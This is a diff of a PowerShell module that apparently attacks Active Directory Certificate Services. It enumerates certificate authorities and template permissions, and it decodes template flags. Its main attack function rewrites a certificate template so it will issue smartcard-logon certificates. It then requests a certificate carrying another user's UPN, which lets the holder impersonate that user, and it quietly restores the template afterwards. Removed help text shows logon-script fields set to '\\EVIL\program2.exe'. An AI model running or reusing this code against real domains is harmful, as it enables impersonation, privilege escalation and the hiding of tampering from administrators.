@@ -1,59 +1,108 @@
-﻿function Get-RootCA{
-
-    [CmdletBinding()]
-    Param (
-        [Parameter(Position = 0, Mandatory = $false)]
-        [ValidateNotNullorEmpty()]
-        [String]
-        $Domain
-    )
-
-if($Domain)
-{
-    $DomainName = "DC=" + $Domain.Replace(".",",DC=")
-}
-else
+﻿function Get-RootCA
 {
     $DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
+    $BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
+    $RootCA =  Get-DomainObject -SearchBase ("CN=Certification Authorities," + $BasePath) -LDAPFilter "(objectclass=certificationAuthority)"
+    $RootCA
 }
 
-$BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
-$RootCA =  Get-DomainObject -SearchBase ("CN=Certification Authorities," + $BasePath) -LDAPFilter "(objectclass=certificationAuthority)"
-
-$RootCA
-
-}
-
-function Get-EnterpriseCA{
-
-    [CmdletBinding()]
-    Param (
-        [Parameter(Position = 0, Mandatory = $false)]
-        [ValidateNotNullorEmpty()]
-        [String]
-        $Domain
-    )
-
-if($Domain)
-{
-    $DomainName = "DC=" + $Domain.Replace(".",",DC=")
-}
-else
+function Get-EnterpriseCA
 {
     $DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
+    $BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
+    $EnterpriseCA = Get-DomainObject -SearchBase ("CN=Enrollment Services," + $BasePath) -LDAPFilter "(objectclass=pKIEnrollmentService)"
+    $EnterpriseCA
 }
 
-$BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
-$IntegratedCA = Get-DomainObject -SearchBase ("CN=Enrollment Services," + $BasePath) -LDAPFilter "(objectclass=pKIEnrollmentService)"
-
-$IntegratedCA
-
-}
-
-function Convert-ADCSNameFlag{
+function Convert-ADCSPrivateKeyFlag
+{
     [CmdletBinding()]
     Param (
-        [Parameter(Position = 1, Mandatory = $true, ValueFromPipeline=$true)]
+        [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
+        [ValidateNotNullorEmpty()]
+        [string]
+        $Flag
+    )
+
+# Based on 2.27 msPKI-Private-Key-Flag Attribute
+# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/f6122d87-b999-4b92-bff8-f465e8949667
+
+$Result = @()
+
+$BitFlag =  [convert]::ToString($Flag,2).padleft(32,'0')
+
+if($BitFlag.Substring(31,1) -eq '1')
+{
+    $Result += "CT_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL"
+}
+
+if($BitFlag.Substring(27,1) -eq '1')
+{
+    $Result += "CT_FLAG_EXPORTABLE_KEY"
+}
+
+if($BitFlag.Substring(26,1) -eq '1')
+{
+    $Result += "CT_FLAG_STRONG_KEY_PROTECTION_REQUIRED"
+}
+
+if($BitFlag.Substring(25,1) -eq '1')
+{
+    $Result += "CT_FLAG_REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM"
+}
+
+if($BitFlag.Substring(24,1) -eq '1')
+{
+    $Result += "CT_FLAG_REQUIRE_SAME_KEY_RENEWAL"
+}
+
+if($BitFlag.Substring(23,1) -eq '1')
+{
+    $Result += "CT_FLAG_USE_LEGACY_PROVIDER"
+}
+
+if($BitFlag -eq '00000000000000000000000000000000')
+{
+    $Result += "CT_FLAG_ATTEST_NONE"
+}
+
+if($BitFlag.Substring(18,1) -eq '1')
+{
+    $Result += "CT_FLAG_ATTEST_REQUIRED"
+}
+
+if($BitFlag.Substring(19,1) -eq '1')
+{
+    $Result += "CT_FLAG_ATTEST_PREFERRED"
+}
+
+if($BitFlag.Substring(17,1) -eq '1')
+{
+    $Result += "CT_FLAG_ATTESTATION_WITHOUT_POLICY"
+}
+
+if($BitFlag.Substring(22,1) -eq '1')
+{
+    $Result += "CT_FLAG_EK_TRUST_ON_USE"
+}
+
+if($BitFlag.Substring(21,1) -eq '1')
+{
+    $Result += "CT_FLAG_EK_VALIDATE_CERT"
+}
+if($BitFlag.Substring(20,1) -eq '1')
+{
+    $Result += "CT_FLAG_EK_VALIDATE_KEY"
+}
+
+$Result
+
+}
+function Convert-ADCSNameFlag
+{
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
         [ValidateNotNullorEmpty()]
         [string]
         $Flag
@@ -130,10 +179,11 @@ $Result
 
 }
 
-function Convert-ADCSEnrollmentFlag{
+function Convert-ADCSEnrollmentFlag
+{
     [CmdletBinding()]
     Param (
-        [Parameter(Position = 1, Mandatory = $true, ValueFromPipeline=$true)]
+        [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
         [ValidateNotNullorEmpty()]
         [string]
         $Flag
@@ -230,16 +280,17 @@ $Result
 }
 
 
-function Convert-ADCSFlag{
+function Convert-ADCSFlag
+{
 
         [CmdletBinding()]
         Param (
-        [Parameter(Position = 1, Mandatory = $true)]
-        [ValidateSet("mspki-enrollment-flag","mspki-certificate-name-flag")]
+        [Parameter(Mandatory = $true)]
+        [ValidateSet("mspki-enrollment-flag","mspki-certificate-name-flag","mspki-private-key-flag")]
         [string]
         $Attribute,
 
-        [Parameter(Position = 2, Mandatory = $true)]
+        [Parameter(Mandatory = $true)]
         [ValidateNotNullorEmpty()]
         [string]
         $Value)
@@ -248,13 +299,15 @@ switch($Attribute)
 {
     "mspki-enrollment-flag" { Convert-ADCSEnrollmentFlag -Flag $Value }
     "mspki-certificate-name-flag"{ Convert-ADCSNameFlag -Flag $Value }
+    "mspki-private-key-flag"{ Convert-ADCSPrivateKeyFlag -Flag $Value }
 }
 
 
 }
 
 
-function Get-ADCSTemplateACL {
+function Get-ADCSTemplateACL 
+{
 
         [CmdletBinding()]
         Param (
@@ -264,26 +317,12 @@ function Get-ADCSTemplateACL {
         $Name,
         
         [Parameter(Mandatory = $false)]
-        [ValidateNotNullorEmpty()]
+        [ValidateSet("AdminACEs","DefaultACEs")]
         [String]
-        $Domain,
-        
-        [Parameter(Mandatory = $false)]
-        [ValidateNotNullorEmpty()]
-        [Switch]
-        $FilterAdmins,
-
-        [Parameter(Mandatory = $false)]
-        [ValidateNotNullorEmpty()]
-        [Switch]
-        $FilterDefault)
+        $Filter)
         
 
-if(-Not $Domain)
-{
-    $Domain = (Get-Domain).Name
-}
-$DomainName = "DC=" + $Domain.Replace(".",",DC=")
+$DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
 $BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
 
 $SearcherArguments = @{"SearchBase"=("CN=Certificate Templates," + $BasePath)}
@@ -291,22 +330,26 @@ $SearcherArguments.Add("LDAPFilter","(objectclass=pKICertificateTemplate)")
 if ($PSBoundParameters['Name']) { $SearcherArguments['LDAPFilter'] = ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") }
 
 $TemplatesACL = Get-DomainObjectACL @SearcherArguments -Resolveguids
-#$TemplatesACL = Get-DomainObjectACL -ResolveGuids -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter "(objectclass=pKICertificateTemplate)"
 
 foreach($acl in $TemplatesACL)
 {
     $acl | Add-Member -MemberType NoteProperty -Name Identity -Value (Convert-SidToName $acl.SecurityIdentifier)
 }
 
-if ($PSBoundParameters['FilterAdmins']) { $TemplatesACL = $TemplatesACL | ? { -not (($_.SecurityIdentifier.value -like "*-512") -or ($_.SecurityIdentifier.value -like "*-519") -or ($_.SecurityIdentifier.value -like "*-516") -or ($_.SecurityIdentifier.value -like "*-500") -or ($_.SecurityIdentifier.value -like "*-498") -or ($_.SecurityIdentifier.value -eq "S-1-5-9")) } }
 
-if ($PSBoundParameters['FilterDefault']) { $TemplatesACL = $TemplatesACL | ? { -not (($_.SecurityIdentifier.value -like "*-512") -or ($_.SecurityIdentifier.value -like "*-519") -or ($_.SecurityIdentifier.value -like "*-516") -or ($_.SecurityIdentifier.value -like "*-500") -or ($_.SecurityIdentifier.value -like "*-498") -or ($_.SecurityIdentifier.value -eq "S-1-5-9") -or ($_.SecurityIdentifier.value -eq "S-1-5-11") -or ($_.SecurityIdentifier.value -like "*-513") -or ($_.SecurityIdentifier.value -like "*-515") -or ($_.SecurityIdentifier.value -like "*-553")) } }
+switch($filter)
+{
+    AdminACEs:{ $TemplatesACL = $TemplatesACL | ? { -not (($_.SecurityIdentifier.value -like "*-512") -or ($_.SecurityIdentifier.value -like "*-519") -or ($_.SecurityIdentifier.value -like "*-516") -or ($_.SecurityIdentifier.value -like "*-500") -or ($_.SecurityIdentifier.value -like "*-498") -or ($_.SecurityIdentifier.value -eq "S-1-5-9")) } }
+
+    DefaultACEs:{ $TemplatesACL = $TemplatesACL | ? { -not (($_.SecurityIdentifier.value -like "*-512") -or ($_.SecurityIdentifier.value -like "*-519") -or ($_.SecurityIdentifier.value -like "*-516") -or ($_.SecurityIdentifier.value -like "*-500") -or ($_.SecurityIdentifier.value -like "*-498") -or ($_.SecurityIdentifier.value -eq "S-1-5-9") -or ($_.SecurityIdentifier.value -eq "S-1-5-11") -or ($_.SecurityIdentifier.value -like "*-513") -or ($_.SecurityIdentifier.value -like "*-515") -or ($_.SecurityIdentifier.value -like "*-553")) } }
+}
 
 $TemplatesACL
 
 }
 
-function Get-ADCSTemplate{
+function Get-ADCSTemplate
+{
 
     [CmdletBinding()]
     Param (
@@ -314,11 +357,6 @@ function Get-ADCSTemplate{
         [ValidateNotNullorEmpty()]
         [String]
         $Name,
-
-        [Parameter(Mandatory = $false)]
-        [ValidateNotNullorEmpty()]
-        [String]
-        $Domain,
 
         [Parameter(Mandatory = $false)]
         [ValidateNotNullorEmpty()]
@@ -336,11 +374,7 @@ function Get-ADCSTemplate{
         $Raw
     )
 
-if(-Not $Domain)
-{
-    $Domain = (Get-Domain).Name
-}
-$DomainName = "DC=" + $Domain.Replace(".",",DC=")
+$DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
 $BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
 
 $SearcherArguments = @{"SearchBase"=("CN=Certificate Templates," + $BasePath)}
@@ -378,6 +412,12 @@ if($ResolveFlags)
         {
             $t | Add-Member -MemberType NoteProperty -Name "EnrollmentFlag" -Value $EnrollmentFlag
         }
+
+        $PrivateKeyFlag = Convert-ADCSFlag -Attribute mspki-private-key-flag -Value $t."mspki-private-key-flag"
+        if($PrivateKeyFlag)
+        {
+            $t | Add-Member -MemberType NoteProperty -Name "PrivateKeyFlag" -Value $PrivateKeyFlag
+        }
     }
 
 }
@@ -386,40 +426,6 @@ $Templates
 
 }
 
-function Get-DomainCertificate
-{
-    [CmdletBinding()]
-    Param (
-        [Parameter(Position = 0, Mandatory = $false)]
-        [ValidateNotNullorEmpty()]
-        [Hashtable]
-        $Param)
-
-    $SubjectDN = New-Object -ComObject X509Enrollment.CX500DistinguishedName
-    $SubjectDN.Encode("CN=Chuck Norris,OU=Users,OU=MAIN,DC=corp,DC=contoso,DC=com", [System.Security.Cryptography.X509Certificates.X500DistinguishedNameFlags](0))
-
-    $SAN = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
-    $IANs = New-Object -ComObject X509Enrollment.CAlternativeNames
-    $IAN = New-Object -ComObject X509Enrollment.CAlternativeName
-    $IAN.InitializeFromString(0xB,"norris@corp.contoso.com")
-    $IANs.Add($IAN)
-    $SAN.InitializeEncode($IANs)
-
-    $csps = New-Object -ComObject X509Enrollment.CCSPInformations
-    $csps.AddAvailableCsps()
-
-    $pk = New-Object -ComObject X509Enrollment.CX509PrivateKey
-    $pk.ContainerName = "Hugo"
-    $pk.ProviderName = "Microsoft Base Smart Card Crypto Provider"
-    $pk.ProviderType = X509ProviderType.XCN_PROV_RSA_FULL
-    $pk.Length = 2048;
-    $pk.KeySpec = "X509KeySpec.XCN_AT_KEYEXCHANGE"
-
-    $Request = New-Object -ComObject X509Enrollment.CX509Enrollment
-    $Request.InitializeFromTemplateName(0x1,"Test101")
-    $Request.Request.X509Extensions.Add($SAN)
-    $Request.Enroll()
-}
 
 function Set-ADCSTemplate
 {
@@ -442,10 +448,7 @@ function Set-ADCSTemplate
 
         )
 
-if(-Not $Domain)
-{
-    $Domain = (Get-Domain).Name
-}      
+$Domain = (Get-Domain).Name    
 $DomainName = "DC=" + $Domain.Replace(".",",DC=")
 $BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
 
@@ -473,20 +476,14 @@ else {
         }
         foreach($p in $Properties.GetEnumerator())
         {
-            if($p.Value.contains(";"))
-            {
-                Set-CFDomainObject -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") -Set @{$p.Key=$p.Value} -MultiStringValue
-            }
-            else {
                 if($p.Value -eq "CLEAR")
                 {
-                    Set-CFDomainObject -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") -Clear $p.Key
+                    Set-DomainObject -Identity $Name -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") -Clear $p.Key
                 }
                 else 
                 {
-                    Set-CFDomainObject -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") -Set @{$p.Key=$p.Value}
+                    Set-DomainObject -Identity $Name -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") -Set @{$p.Key=$p.Value}
                 }
-            }
 
         }
     }
@@ -551,45 +548,45 @@ if(-not (Get-ADCSTemplate -Name $TemplateName))
 if(-not $STOPERROR)
 {
 
-    $TargetCN = $user.distinguishedname
     $TargetUPN = $user.userprincipalname
 
     $Properties = @{}
-    $Properties.Add('mspki-certificate-name-flag','1')
-    $Properties.Add('pkiextendedkeyusage','1.3.6.1.4.1.311.20.2.2;1.3.6.1.5.5.7.3.2')
-    $Properties.Add('msPKI-Certificate-Application-Policy','1.3.6.1.4.1.311.20.2.2;1.3.6.1.5.5.7.3.2')
+    $Properties.Add('mspki-certificate-name-flag',1)
+    $Properties.Add('pkiextendedkeyusage',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
+    $Properties.Add('msPKI-Certificate-Application-Policy',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
+    $Properties.Add('flags','CLEAR')
+    $Properties.Add('mspki-enrollment-flag',0)
+    $Properties.Add('mspki-private-key-flag',256)
+    $Properties.Add('pkidefaultkeyspec',1)
 
     if($PSBoundParameters['NoSmartcard'])
     {
         $Properties.Add('pKIDefaultCSPs','1,Microsoft RSA SChannel Cryptographic Provider')
+        $Properties.'mspki-private-key-flag' += 16
     }
     else
     {
         $Properties.Add('pKIDefaultCSPs','1,Microsoft Base Smart Card Crypto Provider')
     }
 
-    $Properties.Add('flags','CLEAR')
-
-    Write-Output "Changing template $TemplateName to enroll smartcard certificates"
+    Write-Verbose "Changing template $TemplateName into a smartcard template"
     Set-ADCSTemplate -Name $TemplateName -Properties $Properties -Force
 
-    Write-Output "Requesting Certificate"
-    $SubjectDN = New-Object -ComObject X509Enrollment.CX500DistinguishedName
-    $SubjectDN.Encode($TargetCN)
-    #$SubjectDN.Encode($TargetCN, [System.Security.Cryptography.X509Certificates.X500DistinguishedNameFlags](0))
+    Write-Verbose "Requesting certificate for $($TargetUPN)"
 
     $SAN = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
     $IANs = New-Object -ComObject X509Enrollment.CAlternativeNames
-     $IAN = New-Object -ComObject X509Enrollment.CAlternativeName
+    $IAN = New-Object -ComObject X509Enrollment.CAlternativeName
     $IAN.InitializeFromString(0xB,$TargetUPN)
     $IANs.Add($IAN)
     $SAN.InitializeEncode($IANs)
     $Request = New-Object -ComObject X509Enrollment.CX509Enrollment
     $Request.InitializeFromTemplateName(0x1,$TemplateName)
     $Request.Request.X509Extensions.Add($SAN)
+    $Request.CertificateFriendlyName = $TemplateName
     $Request.Enroll()
 
-    Write-Output "Rolling back changes"
+    Write-Verbose "Rolling back changes to template. Nothing happend here..."
     Reset-ADCSTemplate -Name $TemplateName
 
 }
@@ -598,14 +595,11 @@ if(-not $STOPERROR)
 
 function New-VirtualSmartCard
 {
-    
-Write-Warning "Automatic generation of virtual smart cards is for testing only."
-
-$VSCName = "VSC" + (get-random -Minimum 1000 -Maximum 9999).ToString()
-$VSCArgs = "create /name " + $VSCName + " /pin default /adminkey random /generate"
+    $VSCName = "VSC" + (get-random -Minimum 1000 -Maximum 9999).ToString()   
+    $VSCArgs = "create /name " + $VSCName + " /pin default /adminkey random /generate"
 
     $pinfo = New-Object System.Diagnostics.ProcessStartInfo
-    $pinfo.FileName = "tpmvscmgr.exe"
+    $pinfo.FileName = "C:\Windows\System32\tpmvscmgr.exe"
     $pinfo.RedirectStandardError = $true
     $pinfo.RedirectStandardOutput = $true
     $pinfo.UseShellExecute = $false
@@ -620,302 +614,68 @@ $VSCArgs = "create /name " + $VSCName + " /pin default /adminkey random /generat
     if($stderr)
     {
         Write-Warning "An error occurred during VSC generation."
-        Write-Verbose $stderr
+        Write-Warning $stderr
     }
     else {
         Write-Output "Virtual smartcard $($VSCName) created"
+        Write-Output "Pin: 12345678"
     }
 }
 
-#Quick and dirty modifcation of Will Schroeders Set-DomainObject to implement multistring values
-function Set-CFDomainObject {
-    <#
-    .SYNOPSIS
-    
-    Modifies a gven property for a specified active directory object.
-    
-    Author: Will Schroeder (@harmj0y)  
-    License: BSD 3-Clause  
-    Required Dependencies: Get-DomainObject  
-    
-    .DESCRIPTION
-    
-    Splats user/object targeting parameters to Get-DomainObject, returning the raw
-    searchresult object. Retrieves the raw directoryentry for the object, and sets
-    any values from -Set @{}, XORs any values from -XOR @{}, and clears any values
-    from -Clear @().
-    
-    .PARAMETER Identity
-    
-    A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-    SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-    Wildcards accepted.
-    
-    .PARAMETER Set
-    
-    Specifies values for one or more object properties (in the form of a hashtable) that will replace the current values.
-    
-    .PARAMETER XOR
-    
-    Specifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.
-    
-    .PARAMETER Clear
-    
-    Specifies an array of object properties that will be cleared in the directory.
-    
-    .PARAMETER Domain
-    
-    Specifies the domain to use for the query, defaults to the current domain.
-    
-    .PARAMETER LDAPFilter
-    
-    Specifies an LDAP query string that is used to filter Active Directory objects.
-    
-    .PARAMETER SearchBase
-    
-    The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-    Useful for OU queries.
-    
-    .PARAMETER Server
-    
-    Specifies an Active Directory server (domain controller) to bind to.
-    
-    .PARAMETER SearchScope
-    
-    Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-    
-    .PARAMETER ResultPageSize
-    
-    Specifies the PageSize to set for the LDAP searcher object.
-    
-    .PARAMETER ServerTimeLimit
-    
-    Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-    
-    .PARAMETER Tombstone
-    
-    Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-    
-    .PARAMETER MultiStringValue
-    
-    Indicates that the property you want to set via "-Set" contains a multi string value. Separate the values with a semicolon like this: -Set @{"Key" = "Value1;Value2"}
-    
-    .PARAMETER Credential
-    
-    A [Management.Automation.PSCredential] object of alternate credentials
-    for connection to the target domain.
-    
-    .EXAMPLE
-    
-    Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
-    
-    VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-    VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
-    VERBOSE: Setting mstsinitialprogram to \\EVIL\program.exe for object testuser
-    
-    .EXAMPLE
-    
-    "S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\EVIL\program2.exe'} -Verbose
-    
-    VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-    VERBOSE: Get-DomainObject filter string:
-    (&(|(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))
-    VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object harmj0y
-    VERBOSE: Setting countrycode to 1234 for object harmj0y
-    VERBOSE: Get-DomainSearcher search string:
-    LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-    VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
-    VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object testuser
-    VERBOSE: Setting countrycode to 1234 for object testuser
-    
-    .EXAMPLE
-    
-    "S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Clear department -Verbose
-    
-    Cleares the 'department' field for both object identities.
-    
-    .EXAMPLE
-    
-    Get-DomainUser testuser | ConvertFrom-UACValue -Verbose
-    
-    Name                           Value
-    ----                           -----
-    NORMAL_ACCOUNT                 512
-    
-    
-    Set-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose
-    
-    VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-    VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
-    VERBOSE: XORing 'useraccountcontrol' with '65536' for object 'testuser'
-    
-    Get-DomainUser testuser | ConvertFrom-UACValue -Verbose
-    
-    Name                           Value
-    ----                           -----
-    NORMAL_ACCOUNT                 512
-    DONT_EXPIRE_PASSWORD           65536
-    
-    .EXAMPLE
-    
-    Get-DomainUser -Identity testuser -Properties scriptpath
-    
-    scriptpath
-    ----------
-    \\primary\sysvol\blah.ps1
-    
-    $SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
-    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-    Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe'} -Credential $Cred -Verbose
-    VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
-    VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
-    VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-    VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
-    VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
-    VERBOSE: [Set-DomainObject] Setting 'scriptpath' to '\\EVIL\program2.exe' for object 'testuser'
-    
-    Get-DomainUser -Identity testuser -Properties scriptpath
-    
-    scriptpath
-    ----------
-    \\EVIL\program2.exe
-    #>
-    
-        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
-        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-        [CmdletBinding()]
-        Param(
-            [Parameter(Position = 0, Mandatory = $False, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
-            [Alias('DistinguishedName', 'SamAccountName', 'Name')]
-            [String[]]
-            $Identity,
-    
-            [ValidateNotNullOrEmpty()]
-            [Alias('Replace')]
-            [Hashtable]
-            $Set,
-    
-            [ValidateNotNullOrEmpty()]
-            [Hashtable]
-            $XOR,
-    
-            [ValidateNotNullOrEmpty()]
-            [String[]]
-            $Clear,
-    
-            [ValidateNotNullOrEmpty()]
-            [String]
-            $Domain,
-    
-            [ValidateNotNullOrEmpty()]
-            [Alias('Filter')]
-            [String]
-            $LDAPFilter,
-    
-            [ValidateNotNullOrEmpty()]
-            [Alias('ADSPath')]
-            [String]
-            $SearchBase,
-    
-            [ValidateNotNullOrEmpty()]
-            [Alias('DomainController')]
-            [String]
-            $Server,
-    
-            [ValidateSet('Base', 'OneLevel', 'Subtree')]
-            [String]
-            $SearchScope = 'Subtree',
-    
-            [ValidateRange(1, 10000)]
-            [Int]
-            $ResultPageSize = 200,
-    
-            [ValidateRange(1, 10000)]
-            [Int]
-            $ServerTimeLimit,
-            
-            [Switch]
-            $Tombstone,
-    
-            [Switch]
-            $MultiStringValue,
-    
-            [Management.Automation.PSCredential]
-            [Management.Automation.CredentialAttribute()]
-            $Credential = [Management.Automation.PSCredential]::Empty
-        )
-    
-        BEGIN {
-            $SearcherArguments = @{'Raw' = $True}
-            if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
-            if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
-            if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
-            if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
-            if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
-            if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
-            if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
-            if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
-            if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        }
-    
-        PROCESS {
-            if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
-    
-            # splat the appropriate arguments to Get-DomainObject
-            $RawObject = Get-DomainObject @SearcherArguments
-    
-            ForEach ($Object in $RawObject) {
-    
-                $Entry = $RawObject.GetDirectoryEntry()
-    
-                if($PSBoundParameters['Set']) {
-                    try {
-                        $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
-                            if($PSBoundParameters['MultiStringValue']) 
-                            {
-                                $_.Value = $_.Value.Split(";").Trim()
-                            }
-                            Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
-                            $Entry.put($_.Name, $_.Value)
-                        }
-                        $Entry.commitchanges()
-                    }
-                    catch {
-                        Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
-                    }
-                }
-                if($PSBoundParameters['XOR']) {
-                    try {
-                        $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
-                            $PropertyName = $_.Name
-                            $PropertyXorValue = $_.Value
-                            Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
-                            $TypeName = $Entry.$PropertyName[0].GetType().name
-    
-                            # UAC value references- https://support.microsoft.com/en-us/kb/305144
-                            $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
-                            $Entry.$PropertyName = $PropertyValue -as $TypeName
-                        }
-                        $Entry.commitchanges()
-                    }
-                    catch {
-                        Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
-                    }
-                }
-                if($PSBoundParameters['Clear']) {
-                    try {
-                        $PSBoundParameters['Clear'] | ForEach-Object {
-                            $PropertyName = $_
-                            Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
-                            $Entry.$PropertyName.clear()
-                        }
-                        $Entry.commitchanges()
-                    }
-                    catch {
-                        Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
-                    }
-                }
+function Get-VirtualSmartCard
+{
+    Get-wmiobject win32_PnPEntity | ? {$_.ClassGuid -eq "{50DD5230-BA8A-11D1-BF5D-0000F805F530}"} | select-object Name, Description, DeviceID
+}
+
+function Remove-VirtualSmartCard
+{
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $false)]
+        [ValidateNotNullorEmpty()]
+        [String]
+        $DeviceID)
+
+    if($PSBoundParameters['DeviceID'])
+    {
+        $VSC = Get-VirtualSmartCard | ? {$_.DeviceID -eq $DeviceID}
+    }
+    else
+    {
+        $VSC = Get-VirtualSmartCard
+    }
+
+    if(-not $VSC)
+    {
+        Write-Warning "Virtual Smartcard not found."
+    }
+    else {
+        
+        foreach($v in $VSC)
+        {
+            $VSCArgs = "destroy /instance " + $v.DeviceID
+
+            $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+            $pinfo.FileName = "C:\Windows\System32\tpmvscmgr.exe"
+            $pinfo.RedirectStandardError = $true
+            $pinfo.RedirectStandardOutput = $true
+            $pinfo.UseShellExecute = $false
+            $pinfo.Arguments = $VSCArgs
+            $p = New-Object System.Diagnostics.Process
+            $p.StartInfo = $pinfo
+            $p.Start() | Out-Null
+            $p.WaitForExit()
+            $stdout = $p.StandardOutput.ReadToEnd()
+            $stderr = $p.StandardError.ReadToEnd()
+
+            if($stderr)
+            {
+                Write-Warning "An error occurred."
+                Write-Verbose $stderr
+            }
+            else {
+                Write-Output "Virtual smartcard $($v.DeviceID) deleted"
             }
         }
     }
-    
+}
